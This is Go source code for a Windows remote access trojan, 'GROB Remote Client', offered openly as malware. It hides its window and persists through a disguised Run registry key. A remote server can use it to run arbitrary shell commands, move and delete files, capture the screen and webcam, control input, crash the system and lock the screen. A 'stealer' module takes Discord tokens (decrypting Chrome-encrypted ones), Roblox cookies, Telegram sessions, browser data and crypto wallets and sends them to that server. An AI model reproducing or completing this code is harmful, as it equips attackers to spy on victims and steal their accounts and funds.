// t.me/SentinelLinks

// GROB Remote Client for Windows
// Cross-compile: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o client.exe

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/jpeg"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// Placeholders replaced by builder
var (
	ServerURL   = "{{SERVER_URL}}"
	UserUID     = "{{USER_UID}}"
	AutoStartup = "{{AUTO_STARTUP}}" == "true"
	HiddenMode  = "{{HIDDEN_MODE}}" == "true"
)

type Message struct {
	Type    string          `json:"type"`
	Command string          `json:"command,omitempty"`
	Data    json.RawMessage `json:"data,omitempty"`
}

var (
	conn      *websocket.Conn
	connMutex sync.Mutex
)

// Windows API
var (
	user32                    = windows.NewLazySystemDLL("user32.dll")
	kernel32                  = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                     = windows.NewLazySystemDLL("ntdll.dll")
	procMessageBoxW           = user32.NewProc("MessageBoxW")
	procSystemParametersInfoW = user32.NewProc("SystemParametersInfoW")
	procSetCursorPos          = user32.NewProc("SetCursorPos")
	procBlockInput            = user32.NewProc("BlockInput")
	procRtlAdjustPrivilege    = ntdll.NewProc("RtlAdjustPrivilege")
	procNtRaiseHardError      = ntdll.NewProc("NtRaiseHardError")
	// Mouse/keyboard input
	procMouseEvent       = user32.NewProc("mouse_event")
	procKeyboardEvent    = user32.NewProc("keybd_event")
	procSendInput        = user32.NewProc("SendInput")
	procGetSystemMetrics = user32.NewProc("GetSystemMetrics")
)

const (
	MB_OK                = 0x00000000
	MB_ICONINFORMATION   = 0x00000040
	MB_ICONWARNING       = 0x00000030
	MB_ICONERROR         = 0x00000010
	MB_ICONQUESTION      = 0x00000020
	SPI_SETDESKWALLPAPER = 0x0014
	SPIF_UPDATEINIFILE   = 0x01
	SPIF_SENDCHANGE      = 0x02
	// Mouse events
	MOUSEEVENTF_MOVE       = 0x0001
	MOUSEEVENTF_LEFTDOWN   = 0x0002
	MOUSEEVENTF_LEFTUP     = 0x0004
	MOUSEEVENTF_RIGHTDOWN  = 0x0008
	MOUSEEVENTF_RIGHTUP    = 0x0010
	MOUSEEVENTF_MIDDLEDOWN = 0x0020
	MOUSEEVENTF_MIDDLEUP   = 0x0040
	MOUSEEVENTF_ABSOLUTE   = 0x8000
	MOUSEEVENTF_WHEEL      = 0x0800
	// Keyboard events
	KEYEVENTF_KEYUP = 0x0002
	// System metrics
	SM_CXSCREEN = 0
	SM_CYSCREEN = 1
)

func main() {
	defer func() {
		if r := recover(); r != nil {
			time.Sleep(5 * time.Second)
			main() // Restart on panic
		}
	}()

	if AutoStartup {
		safeCall(setupAutoStartup)
	}

	// Reconnection loop
	for {
		err := connectAndRun()
		if err != nil {
			time.Sleep(5 * time.Second)
		}
	}
}

func safeCall(fn func()) {
	defer func() {
		if r := recover(); r != nil {
			// Ignore panic, continue execution
		}
	}()
	fn()
}

func safeCallWithError(fn func() error) error {
	defer func() {
		if r := recover(); r != nil {
			// Ignore panic
		}
	}()
	return fn()
}

func setupAutoStartup() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	key, err := registry.OpenKey(registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE)
	if err != nil {
		return
	}
	defer key.Close()

	key.SetStringValue("WindowsService", exePath)
}

func connectAndRun() error {
	defer func() {
		if r := recover(); r != nil {
			// Connection error, will retry
		}
	}()

	var err error
	conn, _, err = websocket.DefaultDialer.Dial(ServerURL, nil)
	if err != nil {
		return fmt.Errorf("dial failed: %w", err)
	}
	defer conn.Close()

	// Send hello
	hello := map[string]interface{}{
		"type": "client_hello",
		"data": map[string]string{
			"hostname": getHostname(),
			"os":       "Windows",
			"os_full":  getWindowsVersion(),
			"ip":       getLocalIP(),
			"user_uid": UserUID,
		},
	}
	if err := safeWriteJSON(hello); err != nil {
		return err
	}

	// Message loop
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return err
		}

		var msg Message
		if err := json.Unmarshal(data, &msg); err != nil {
			continue
		}

		go safeHandleMessage(msg)
	}
}

func safeWriteJSON(v interface{}) error {
	connMutex.Lock()
	defer connMutex.Unlock()
	if conn == nil {
		return fmt.Errorf("connection is nil")
	}
	return conn.WriteJSON(v)
}

func safeHandleMessage(msg Message) {
	defer func() {
		if r := recover(); r != nil {
			// Log error but don't crash
			sendError("handler_error", fmt.Sprintf("Panic in handler: %v", r))
		}
	}()
	handleMessage(msg)
}

func sendError(errorType, message string) {
	safeWriteJSON(map[string]interface{}{
		"type": "error",
		"data": map[string]string{
			"error_type": errorType,
			"message":    message,
		},
	})
}

func handleMessage(msg Message) {
	switch msg.Type {
	case "command":
		handleCommand(msg)
	}
}

func handleCommand(msg Message) {
	switch msg.Command {
	case "screenshot":
		safeCall(sendScreenshot)

	case "cmd":
		var data struct {
			Command string `json:"command"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("cmd_error", "Invalid command data")
			return
		}
		go executeCommand(data.Command)

	case "stealer":
		go safeCall(sendStealerData)

	case "file_upload":
		var data struct {
			FileName string `json:"fileName"`
			FileData string `json:"fileData"`
			FileSize int64  `json:"fileSize"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("file_upload_error", "Invalid file data")
			return
		}
		go handleFileUpload(data.FileName, data.FileData)

	case "file_execute":
		var data struct {
			FileName string `json:"fileName"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("file_execute_error", "Invalid file data")
			return
		}
		go handleFileExecute(data.FileName)

	case "file_list":
		var data struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("file_list_error", "Invalid path data")
			return
		}
		go handleFileList(data.Path)

	case "file_download":
		var data struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("file_download_error", "Invalid path data")
			return
		}
		go handleFileDownload(data.Path)

	case "file_delete":
		var data struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("file_delete_error", "Invalid path data")
			return
		}
		go handleFileDelete(data.Path)

	case "file_run":
		var data struct {
			Path string `json:"path"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			sendError("file_run_error", "Invalid path data")
			return
		}
		go handleFileRun(data.Path)

	case "webcam_list":
		go handleWebcamList()

	case "webcam_capture":
		var data struct {
			DeviceID string `json:"deviceId"`
		}
		json.Unmarshal(msg.Data, &data)
		go handleWebcamCapture(data.DeviceID)

	case "input":
		var data struct {
			Type    string `json:"type"`
			Action  string `json:"action"`
			X       int    `json:"x"`
			Y       int    `json:"y"`
			Button  int    `json:"button"`
			Key     string `json:"key"`
			KeyCode int    `json:"keyCode"`
			Delta   int    `json:"delta"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			return
		}
		handleInput(data.Type, data.Action, data.X, data.Y, data.Button, data.Key, data.KeyCode, data.Delta)

	case "fun":
		var data struct {
			Action  string `json:"action"`
			Message string `json:"message"`
			Title   string `json:"title"`
			Type    string `json:"type"`
			URL     string `json:"url"`
			Enabled bool   `json:"enabled"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			return
		}
		go handleFunCommand(data.Action, data)

	case "fun_message":
		var data struct {
			Title   string `json:"title"`
			Message string `json:"message"`
			Type    string `json:"type"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			return
		}
		go showMessage(data.Title, data.Message, data.Type)

	case "fun_wallpaper":
		var data struct {
			URL string `json:"url"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			return
		}
		go setWallpaper(data.URL)

	case "fun_sound":
		go playSound()

	case "fun_openurl":
		var data struct {
			URL string `json:"url"`
		}
		if err := json.Unmarshal(msg.Data, &data); err != nil {
			return
		}
		go openURL(data.URL)

	case "fun_bsod":
		go triggerBSOD()

	case "fun_restart":
		go restartPC()

	case "fun_shutdown":
		go shutdownPC()

	case "fun_shake":
		go shakeScreen()

	case "monitors_list":
		go handleMonitorsList()
	}
}

// === FILE MANAGER ===

func handleFileList(path string) {
	defer func() {
		if r := recover(); r != nil {
			sendError("file_list_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	// Default to user's home directory
	if path == "" || path == "/" {
		path = os.Getenv("USERPROFILE")
		if path == "" {
			path = "C:\\"
		}
	}

	// Handle drive root
	if len(path) == 2 && path[1] == ':' {
		path = path + "\\"
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		// Try to list drives if path is invalid
		if path == "C:\\" || strings.HasPrefix(err.Error(), "open") {
			drives := getAvailableDrives()
			safeWriteJSON(map[string]interface{}{
				"type": "file_list_response",
				"data": map[string]interface{}{
					"path":  path,
					"files": drives,
				},
			})
			return
		}
		sendError("file_list_error", err.Error())
		return
	}

	var files []map[string]interface{}
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		file := map[string]interface{}{
			"name":     entry.Name(),
			"isDir":    entry.IsDir(),
			"size":     info.Size(),
			"modified": info.ModTime().Format(time.RFC3339),
		}
		files = append(files, file)
	}

	// Sort: directories first, then by name
	sort.Slice(files, func(i, j int) bool {
		iDir := files[i]["isDir"].(bool)
		jDir := files[j]["isDir"].(bool)
		if iDir != jDir {
			return iDir
		}
		return strings.ToLower(files[i]["name"].(string)) < strings.ToLower(files[j]["name"].(string))
	})

	safeWriteJSON(map[string]interface{}{
		"type": "file_list_response",
		"data": map[string]interface{}{
			"path":  path,
			"files": files,
		},
	})
}

func getAvailableDrives() []map[string]interface{} {
	var drives []map[string]interface{}

	for letter := 'A'; letter <= 'Z'; letter++ {
		drive := fmt.Sprintf("%c:\\", letter)
		_, err := os.Stat(drive)
		if err == nil {
			drives = append(drives, map[string]interface{}{
				"name":  fmt.Sprintf("%c:", letter),
				"isDir": true,
				"size":  int64(0),
			})
		}
	}

	return drives
}

func handleFileDownload(path string) {
	defer func() {
		if r := recover(); r != nil {
			sendError("file_download_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	// Check file exists
	info, err := os.Stat(path)
	if err != nil {
		sendError("file_download_error", "File not found: "+err.Error())
		return
	}

	if info.IsDir() {
		sendError("file_download_error", "Cannot download directory")
		return
	}

	// Limit file size to 50MB
	if info.Size() > 50*1024*1024 {
		sendError("file_download_error", "File too large (max 50MB)")
		return
	}

	data, err := os.ReadFile(path)
	if err != nil {
		sendError("file_download_error", "Cannot read file: "+err.Error())
		return
	}

	safeWriteJSON(map[string]interface{}{
		"type": "file_download_response",
		"data": map[string]interface{}{
			"path":     path,
			"fileName": filepath.Base(path),
			"fileData": base64.StdEncoding.EncodeToString(data),
			"fileSize": info.Size(),
		},
	})
}

func handleFileDelete(path string) {
	defer func() {
		if r := recover(); r != nil {
			sendError("file_delete_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

// t.me/SentinelLinks
	info, err := os.Stat(path)
	if err != nil {
		sendError("file_delete_error", "File not found: "+err.Error())
		return
	}

	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}

	if err != nil {
		sendError("file_delete_error", "Cannot delete: "+err.Error())
		return
	}

	safeWriteJSON(map[string]interface{}{
		"type": "file_delete_response",
		"data": map[string]interface{}{
			"path":    path,
			"success": true,
		},
	})
}

func handleFileRun(path string) {
	defer func() {
		if r := recover(); r != nil {
			sendError("file_run_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	if _, err := os.Stat(path); err != nil {
		sendError("file_run_error", "File not found: "+err.Error())
		return
	}

	cmd := exec.Command("cmd", "/c", "start", "", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()

	if err != nil {
		sendError("file_run_error", "Cannot run: "+err.Error())
		return
	}

	safeWriteJSON(map[string]interface{}{
		"type": "file_run_response",
		"data": map[string]interface{}{
			"path":    path,
			"success": true,
		},
	})
}

// === WEBCAM ===

func handleWebcamList() {
	defer func() {
		if r := recover(); r != nil {
			sendError("webcam_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	// Use PowerShell to get camera list
	cmd := exec.Command("powershell", "-Command", `
		Get-PnpDevice -Class Camera -Status OK | Select-Object -Property FriendlyName, InstanceId | ConvertTo-Json
	`)
	output, err := cmd.Output()

	var cameras []map[string]string
	if err == nil && len(output) > 0 {
		var devices []struct {
			FriendlyName string `json:"FriendlyName"`
			InstanceId   string `json:"InstanceId"`
		}
		if json.Unmarshal(output, &devices) == nil {
			for i, d := range devices {
				cameras = append(cameras, map[string]string{
					"id":    fmt.Sprintf("%d", i),
					"label": d.FriendlyName,
				})
			}
		}
	}

	// Fallback if no cameras found
	if len(cameras) == 0 {
		cameras = append(cameras, map[string]string{
			"id":    "0",
			"label": "Default Camera",
		})
	}

	safeWriteJSON(map[string]interface{}{
		"type": "webcam_list_response",
		"data": map[string]interface{}{
			"cameras": cameras,
		},
	})
}

func handleWebcamCapture(deviceID string) {
	defer func() {
		if r := recover(); r != nil {
			sendError("webcam_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	// Use ffmpeg to capture single frame
	tmpFile := filepath.Join(os.TempDir(), "webcam_capture.jpg")

	deviceIndex := "0"
	if deviceID != "" {
		deviceIndex = deviceID
	}

	cmd := exec.Command("ffmpeg", "-f", "dshow", "-i", fmt.Sprintf("video=%s", deviceIndex),
		"-frames:v", "1", "-y", tmpFile)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err := cmd.Run()
	if err != nil {
		// Fallback: try with default device name
		cmd = exec.Command("ffmpeg", "-f", "dshow", "-list_devices", "true", "-i", "dummy")
		output, _ := cmd.CombinedOutput()

		// Try to find first video device
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.Contains(line, "video") && strings.Contains(line, "\"") {
				start := strings.Index(line, "\"")
				end := strings.LastIndex(line, "\"")
				if start != -1 && end > start {
					deviceName := line[start+1 : end]
					cmd = exec.Command("ffmpeg", "-f", "dshow", "-i", fmt.Sprintf("video=%s", deviceName),
						"-frames:v", "1", "-y", tmpFile)
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					err = cmd.Run()
					break
				}
			}
		}
	}

	if err != nil {
		sendError("webcam_error", "Cannot capture from webcam")
		return
	}

	data, err := os.ReadFile(tmpFile)
	if err != nil {
		sendError("webcam_error", "Cannot read capture file")
		return
	}

	os.Remove(tmpFile)

	safeWriteJSON(map[string]interface{}{
		"type": "webcam_frame",
		"data": base64.StdEncoding.EncodeToString(data),
	})
}

// === INPUT HANDLING (REMOTE CONTROL) ===

func handleInput(inputType, action string, x, y, button int, key string, keyCode int, delta int) {
	defer func() {
		if r := recover(); r != nil {
			// Ignore input errors
		}
	}()

	switch inputType {
	case "mouse":
		handleMouseInput(action, x, y, button, delta)
	case "keyboard":
		handleKeyboardInput(action, key, keyCode)
	}
}

func handleMouseInput(action string, x, y, button int, delta int) {
	// Get screen dimensions
	screenWidth, _, _ := procGetSystemMetrics.Call(uintptr(SM_CXSCREEN))
	screenHeight, _, _ := procGetSystemMetrics.Call(uintptr(SM_CYSCREEN))

	if screenWidth == 0 || screenHeight == 0 {
		return
	}

	// Convert to absolute coordinates (0-65535 range)
	absX := (x * 65535) / int(screenWidth)
	absY := (y * 65535) / int(screenHeight)

	switch action {
	case "move":
		procMouseEvent.Call(
			uintptr(MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE),
			uintptr(absX),
			uintptr(absY),
			0, 0,
		)
	case "click":
		// Move to position first
		procMouseEvent.Call(
			uintptr(MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE),
			uintptr(absX),
			uintptr(absY),
			0, 0,
		)
		// Then click
		var downFlag, upFlag uintptr
		switch button {
		case 0: // Left
			downFlag = MOUSEEVENTF_LEFTDOWN
			upFlag = MOUSEEVENTF_LEFTUP
		case 1: // Middle
			downFlag = MOUSEEVENTF_MIDDLEDOWN
			upFlag = MOUSEEVENTF_MIDDLEUP
		case 2: // Right
			downFlag = MOUSEEVENTF_RIGHTDOWN
			upFlag = MOUSEEVENTF_RIGHTUP
		default:
			downFlag = MOUSEEVENTF_LEFTDOWN
			upFlag = MOUSEEVENTF_LEFTUP
		}
		procMouseEvent.Call(downFlag, 0, 0, 0, 0)
		time.Sleep(10 * time.Millisecond)
		procMouseEvent.Call(upFlag, 0, 0, 0, 0)

	case "down":
		procMouseEvent.Call(
			uintptr(MOUSEEVENTF_MOVE|MOUSEEVENTF_ABSOLUTE),
			uintptr(absX),
			uintptr(absY),
			0, 0,
		)
		var downFlag uintptr
		switch button {
		case 0:
			downFlag = MOUSEEVENTF_LEFTDOWN
		case 1:
			downFlag = MOUSEEVENTF_MIDDLEDOWN
		case 2:
			downFlag = MOUSEEVENTF_RIGHTDOWN
		default:
			downFlag = MOUSEEVENTF_LEFTDOWN
		}
		procMouseEvent.Call(downFlag, 0, 0, 0, 0)

	case "up":
		var upFlag uintptr
		switch button {
		case 0:
			upFlag = MOUSEEVENTF_LEFTUP
		case 1:
			upFlag = MOUSEEVENTF_MIDDLEUP
		case 2:
			upFlag = MOUSEEVENTF_RIGHTUP
		default:
			upFlag = MOUSEEVENTF_LEFTUP
		}
		procMouseEvent.Call(upFlag, 0, 0, 0, 0)

	case "scroll":
		procMouseEvent.Call(
			uintptr(MOUSEEVENTF_WHEEL),
			0, 0,
			uintptr(delta*120),
			0,
		)
	}
}

func handleKeyboardInput(action, key string, keyCode int) {
	// Map JavaScript keyCode to Windows virtual key code
	vk := mapKeyCode(keyCode, key)
	if vk == 0 {
		return
	}

	switch action {
	case "down":
		procKeyboardEvent.Call(uintptr(vk), 0, 0, 0)
	case "up":
		procKeyboardEvent.Call(uintptr(vk), 0, uintptr(KEYEVENTF_KEYUP), 0)
	}
}

func mapKeyCode(jsKeyCode int, key string) int {
	// Common key mappings from JavaScript to Windows VK codes
	keyMap := map[int]int{
		8:   0x08, // Backspace
		9:   0x09, // Tab
		13:  0x0D, // Enter
		16:  0x10, // Shift
		17:  0x11, // Ctrl
		18:  0x12, // Alt
		19:  0x13, // Pause
		20:  0x14, // Caps Lock
		27:  0x1B, // Escape
		32:  0x20, // Space
		33:  0x21, // Page Up
		34:  0x22, // Page Down
		35:  0x23, // End
		36:  0x24, // Home
		37:  0x25, // Left Arrow
		38:  0x26, // Up Arrow
		39:  0x27, // Right Arrow
		40:  0x28, // Down Arrow
		45:  0x2D, // Insert
		46:  0x2E, // Delete
		// 0-9
		48: 0x30, 49: 0x31, 50: 0x32, 51: 0x33, 52: 0x34,
		53: 0x35, 54: 0x36, 55: 0x37, 56: 0x38, 57: 0x39,
		// A-Z
		65: 0x41, 66: 0x42, 67: 0x43, 68: 0x44, 69: 0x45,
		70: 0x46, 71: 0x47, 72: 0x48, 73: 0x49, 74: 0x4A,
		75: 0x4B, 76: 0x4C, 77: 0x4D, 78: 0x4E, 79: 0x4F,
		80: 0x50, 81: 0x51, 82: 0x52, 83: 0x53, 84: 0x54,
		85: 0x55, 86: 0x56, 87: 0x57, 88: 0x58, 89: 0x59,
		90: 0x5A,
		// F1-F12
		112: 0x70, 113: 0x71, 114: 0x72, 115: 0x73, 116: 0x74,
		117: 0x75, 118: 0x76, 119: 0x77, 120: 0x78, 121: 0x79,
		122: 0x7A, 123: 0x7B,
		// Numpad
		96: 0x60, 97: 0x61, 98: 0x62, 99: 0x63, 100: 0x64,
		101: 0x65, 102: 0x66, 103: 0x67, 104: 0x68, 105: 0x69,
		106: 0x6A, 107: 0x6B, 109: 0x6D, 110: 0x6E, 111: 0x6F,
		// Punctuation
		186: 0xBA, 187: 0xBB, 188: 0xBC, 189: 0xBD, 190: 0xBE,
		191: 0xBF, 192: 0xC0, 219: 0xDB, 220: 0xDC, 221: 0xDD,
		222: 0xDE,
	}

	if vk, ok := keyMap[jsKeyCode]; ok {
		return vk
	}

	// Fallback: use jsKeyCode directly if in valid range
	if jsKeyCode >= 0 && jsKeyCode <= 255 {
		return jsKeyCode
	}

	return 0
}

// === FUN FUNCTIONS ===

func handleFunCommand(action string, data struct {
	Action  string `json:"action"`
	Message string `json:"message"`
	Title   string `json:"title"`
	Type    string `json:"type"`
	URL     string `json:"url"`
	Enabled bool   `json:"enabled"`
}) {
	defer func() {
		if r := recover(); r != nil {
			sendError("fun_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	switch action {
	case "message":
		showMessage(data.Title, data.Message, data.Type)
	case "wallpaper":
		setWallpaper(data.URL)
	case "sound":
		playSound()
	case "openurl":
		openURL(data.URL)
	case "bsod":
		triggerBSOD()
	case "winlocker":
		triggerWinlocker()
	case "restart":
		restartPC()
	case "shutdown":
		shutdownPC()
	case "shake":
		shakeScreen()
	}
}

func showMessage(title, message, msgType string) {
	defer func() {
		if r := recover(); r != nil {
			// Ignore
		}
	}()

	var flags uintptr = MB_OK
	switch msgType {
	case "info":
		flags |= MB_ICONINFORMATION
	case "warning":
		flags |= MB_ICONWARNING
	case "error":
		flags |= MB_ICONERROR
	case "question":
		flags |= MB_ICONQUESTION
	default:
		flags |= MB_ICONINFORMATION
	}

	titlePtr, _ := syscall.UTF16PtrFromString(title)
	msgPtr, _ := syscall.UTF16PtrFromString(message)
	procMessageBoxW.Call(0, uintptr(unsafe.Pointer(msgPtr)), uintptr(unsafe.Pointer(titlePtr)), flags)
}

func openURL(url string) {
	defer func() { recover() }()
	exec.Command("cmd", "/c", "start", "", url).Run()
}

func playSound() {
	defer func() { recover() }()
	exec.Command("powershell", "-Command", "[console]::beep(1000,500)").Run()
}

func shakeScreen() {
	defer func() { recover() }()
	for i := 0; i < 50; i++ {
		x := 500 + (i%2)*50 - 25
		y := 400 + (i%2)*50 - 25
		procSetCursorPos.Call(uintptr(x), uintptr(y))
		time.Sleep(20 * time.Millisecond)
	}
}

func setWallpaper(url string) {
	defer func() { recover() }()

	resp, err := http.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	tmpFile := filepath.Join(os.TempDir(), "wallpaper.jpg")
	out, err := os.Create(tmpFile)
	if err != nil {
		return
	}
	io.Copy(out, resp.Body)
	out.Close()

	pathPtr, _ := syscall.UTF16PtrFromString(tmpFile)
	procSystemParametersInfoW.Call(
		SPI_SETDESKWALLPAPER,
		0,
		uintptr(unsafe.Pointer(pathPtr)),
		SPIF_UPDATEINIFILE|SPIF_SENDCHANGE,
	)
}

func triggerBSOD() {
	defer func() { recover() }()
	var enabled bool
	procRtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&enabled)))
	var resp uintptr
	procNtRaiseHardError.Call(0xC0000022, 0, 0, 0, 6, uintptr(unsafe.Pointer(&resp)))
}

func triggerWinlocker() {
	defer func() { recover() }()
	procBlockInput.Call(1)

	ps := `
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = 'DarkRed'
$label = New-Object System.Windows.Forms.Label
$label.Text = 'YOUR PC HAS BEEN LOCKED'
$label.Font = New-Object System.Drawing.Font('Arial',48)
$label.ForeColor = 'White'
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(200,300)
$form.Controls.Add($label)
$form.ShowDialog()
`
	exec.Command("powershell", "-Command", ps).Start()
}

func restartPC() {
	defer func() { recover() }()
	exec.Command("shutdown", "/r", "/t", "0").Run()
}

func shutdownPC() {
	defer func() { recover() }()
	exec.Command("shutdown", "/s", "/t", "0").Run()
}

// === SCREENSHOT ===

func sendScreenshot() {
	defer func() {
		if r := recover(); r != nil {
			sendError("screenshot_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	n := screenshot.NumActiveDisplays()
	if n == 0 {
		sendError("screenshot_error", "No displays found")
		return
	}

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		sendError("screenshot_error", err.Error())
		return
	}

	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60}); err != nil {
		sendError("screenshot_error", err.Error())
		return
	}

	safeWriteJSON(map[string]interface{}{
		"type": "screenshot_response",
		"data": base64.StdEncoding.EncodeToString(buf.Bytes()),
	})
}

// === COMMAND EXECUTION ===

func executeCommand(command string) {
	defer func() {
		if r := recover(); r != nil {
			safeWriteJSON(map[string]interface{}{
				"type": "cmd_result",
				"data": map[string]interface{}{
					"output":   fmt.Sprintf("Error: %v", r),
					"exitCode": -1,
				},
			})
		}
	}()

	cmd := exec.Command("cmd", "/c", command)
	output, err := cmd.CombinedOutput()

	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	safeWriteJSON(map[string]interface{}{
		"type": "cmd_result",
		"data": map[string]interface{}{
			"output":   string(output),
			"exitCode": exitCode,
		},
	})
}

// === STEALER ===

func sendStealerData() {
	defer func() {
		if r := recover(); r != nil {
			sendError("stealer_error", fmt.Sprintf("Panic: %v", r))
		}
	}()

	data := map[string]interface{}{
		"type": "stealer_data",
		"data": map[string]interface{}{
			"discord":  safeGetDiscordTokens(),
			"roblox":   safeGetRobloxCookies(),
			"telegram": safeGetTelegramSessions(),
			"browsers": safeGetBrowserData(),
			"crypto":   safeGetCryptoWallets(),
			"system":   getSystemInfo(),
		},
	}
	safeWriteJSON(data)
}

func safeGetDiscordTokens() []map[string]string {
	defer func() { recover() }()
	return getDiscordTokens()
}

func safeGetRobloxCookies() []map[string]string {
	defer func() { recover() }()
	return getRobloxCookies()
}

func safeGetTelegramSessions() []map[string]string {
	defer func() { recover() }()
	return getTelegramSessions()
}

func safeGetBrowserData() []map[string]string {
	defer func() { recover() }()
	return getBrowserData()
}

func safeGetCryptoWallets() []map[string]string {
	defer func() { recover() }()
	return getCryptoWallets()
}

func getDiscordTokens() []map[string]string {
	var tokens []map[string]string

	appdata := os.Getenv("APPDATA")
	localAppdata := os.Getenv("LOCALAPPDATA")

	paths := map[string]string{
		"Discord":        filepath.Join(appdata, "discord", "Local Storage", "leveldb"),
		"Discord Canary": filepath.Join(appdata, "discordcanary", "Local Storage", "leveldb"),
		"Discord PTB":    filepath.Join(appdata, "discordptb", "Local Storage", "leveldb"),
		"Chrome":         filepath.Join(localAppdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
		"Brave":          filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
		"Opera":          filepath.Join(appdata, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
		"Edge":           filepath.Join(localAppdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
	}

	tokenRegex := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
	encryptedRegex := regexp.MustCompile(`dQw4w9WgXcQ:[^"]*`)

	for source, path := range paths {
		files, err := filepath.Glob(filepath.Join(path, "*.ldb"))
		if err != nil {
			continue
		}
		files2, _ := filepath.Glob(filepath.Join(path, "*.log"))
		files = append(files, files2...)

		for _, file := range files {
			content, err := os.ReadFile(file)
			if err != nil {
				continue
			}

			matches := tokenRegex.FindAllString(string(content), -1)
			for _, match := range matches {
				tokens = append(tokens, map[string]string{
					"token":    match,
					"software": source,
					"path":     path,
				})
			}

			encMatches := encryptedRegex.FindAllString(string(content), -1)
			for _, match := range encMatches {
				decrypted := decryptToken(match, source)
				if decrypted != "" {
					tokens = append(tokens, map[string]string{
						"token":    decrypted,
						"software": source + " (encrypted)",
						"path":     path,
					})
				}
			}
		}
	}

// t.me/SentinelLinks
	return tokens
}

func decryptToken(encryptedToken, browser string) string {
	defer func() { recover() }()

	localState := ""
	localAppdata := os.Getenv("LOCALAPPDATA")
	appdata := os.Getenv("APPDATA")

	switch {
	case strings.Contains(browser, "Chrome"):
		localState = filepath.Join(localAppdata, "Google", "Chrome", "User Data", "Local State")
	case strings.Contains(browser, "Discord"):
		localState = filepath.Join(appdata, "discord", "Local State")
	case strings.Contains(browser, "Edge"):
		localState = filepath.Join(localAppdata, "Microsoft", "Edge", "User Data", "Local State")
	case strings.Contains(browser, "Brave"):
		localState = filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State")
	default:
		return ""
	}

	data, err := os.ReadFile(localState)
	if err != nil {
		return ""
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return ""
	}

	osC, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return ""
	}
	encKey, ok := osC["encrypted_key"].(string)
	if !ok {
		return ""
	}

	keyBytes, _ := base64.StdEncoding.DecodeString(encKey)
	if len(keyBytes) < 6 {
		return ""
	}
	keyBytes = keyBytes[5:]

	masterKey, err := decryptDPAPI(keyBytes)
	if err != nil {
		return ""
	}

	parts := strings.Split(encryptedToken, ":")
	if len(parts) != 2 {
		return ""
	}

	tokenBytes, _ := base64.StdEncoding.DecodeString(parts[1])
	if len(tokenBytes) < 28 {
		return ""
	}

	nonce := tokenBytes[3:15]
	ciphertext := tokenBytes[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return ""
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return ""
	}

	return string(plaintext)
}

